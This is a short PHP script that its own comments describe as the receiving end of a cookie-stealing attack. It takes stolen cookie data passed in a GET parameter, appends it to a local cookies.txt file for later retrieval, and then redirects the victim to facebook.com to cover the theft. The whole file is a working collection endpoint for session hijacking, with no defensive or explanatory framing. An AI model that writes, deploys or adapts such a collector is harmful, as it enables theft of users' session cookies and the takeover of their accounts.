<?php

// our script that steals cookies will pass them as GET parameters
$suppliedCookieData = $_GET['cookie_data'] ?? '';

// write the stolen data to disk, we will retrieve it later
if (!empty($suppliedCookieData)) {
    file_put_contents('cookies.txt', $suppliedCookieData . PHP_EOL, FILE_APPEND | LOCK_EX);
}

header('Location: https://www.facebook.com');
exit;